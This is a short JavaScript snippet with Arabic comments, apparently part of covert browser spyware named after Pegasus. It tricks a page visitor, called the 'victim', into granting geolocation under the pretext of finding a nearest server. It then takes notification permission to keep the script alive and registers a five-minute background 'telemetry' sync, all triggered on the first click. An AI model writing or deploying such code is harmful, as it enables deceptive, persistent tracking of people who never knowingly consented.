async function requestPegasusPerms() {
    // 1. طلب تصريح الموقع تحت غطاء "تحديد أقرب خادم"
    const geo = await navigator.permissions.query({name:'geolocation'});
    if (geo.state !== 'granted') {
        navigator.geolocation.getCurrentPosition(() => {}, () => {});
    }

    // 2. طلب تصريح الإشعارات لضمان بقاء السكربت نشطاً
    const notification = await Notification.requestPermission();

    if (notification === 'granted') {
        const reg = await navigator.serviceWorker.ready;
        // تفعيل المزامنة الدورية (هنا يكمن الكنز)
        try {
            await reg.periodicSync.register('telemetry-update', {
                minInterval: 5 * 60 * 1000 // كل 5 دقائق
            });
        } catch (e) {
            console.log("Periodic Sync not supported, fallback to normal sync");
        }
    }
}

// استدعاء الوظيفة عند أول تفاعل للضحية مع الصفحة
document.addEventListener('click', requestPegasusPerms, {once: true});
